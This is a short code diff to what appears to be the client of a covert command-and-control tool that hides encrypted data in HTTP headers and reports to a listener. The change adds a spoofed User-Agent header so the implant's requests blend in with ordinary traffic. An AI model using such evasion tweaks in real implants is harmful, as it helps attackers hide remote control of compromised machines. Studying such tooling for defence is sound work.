@@ -14,7 +14,7 @@ import zlib
 import random
 import string
 from Crypto.Cipher import AES
-from utils import LISTENER_IP, LISTENER_PORT, STEGO_HEADER_NAME, CLIENT_MAX_MESSAGE_LENGTH, AES_KEY, AES_IV, RequestFlags
+from utils import LISTENER_IP, LISTENER_PORT, STEGO_HEADER_NAME, USER_AGENT, CLIENT_MAX_MESSAGE_LENGTH, AES_KEY, AES_IV, RequestFlags
 
 # Time in seconds to wait for a http response before a timeout occurs.
 # This time should be long, to give user ample time to input their commands into the listener. 
@@ -79,7 +79,10 @@ def create_requests(data: str):
     requests = []
     default_request = Request(
         method='GET',
-        headers= {STEGO_HEADER_NAME: ""}
+        headers= {
+            STEGO_HEADER_NAME: "",
+            'User-Agent': USER_AGENT,
+            }
     )
 
     # Check if there is no data to send
